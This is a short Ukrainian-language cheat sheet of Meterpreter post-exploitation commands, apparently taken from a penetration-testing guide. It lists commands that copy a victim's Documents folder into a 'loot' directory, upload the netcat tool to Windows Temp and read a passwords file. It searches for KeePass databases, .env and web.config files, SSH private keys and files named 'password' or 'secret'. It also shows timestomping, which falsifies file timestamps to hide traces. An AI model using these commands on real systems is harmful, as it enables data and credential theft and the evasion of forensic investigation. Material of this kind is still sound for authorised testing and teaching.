Передача файлів та пошук

Файлові команди

# Навігація meterpreter> pwd meterpreter> cd C:\\Users meterpreter> ls # Передача файлів meterpreter> download C:\\Users\\jsmith\\Documents\\ /tmp/loot/ -r meterpreter> upload /tmp/tools/nc.exe C:\\Windows\\Temp\\ # Читання meterpreter> cat passwords.txt

Пошук цінних файлів

# За розширенням meterpreter> search -f *.kdbx meterpreter> search -f *.txt -d C:\\Users\\ # За ім'ям meterpreter> search -f *password* meterpreter> search -f *secret* meterpreter> search -f web.config meterpreter> search -f .env meterpreter> search -f id_rsa -d /home/

Timestomping (T1070.006) — приховування слідів

meterpreter> timestomp C:\\Temp\\nc.exe -v # Перегляд міток meterpreter> timestomp C:\\Temp\\nc.exe -m "2023-01-15 08:30:00" # Зміна Modified meterpreter> timestomp C:\\Temp\\nc.exe -f C:\\Windows\\System32\\calc.exe # Копіювати
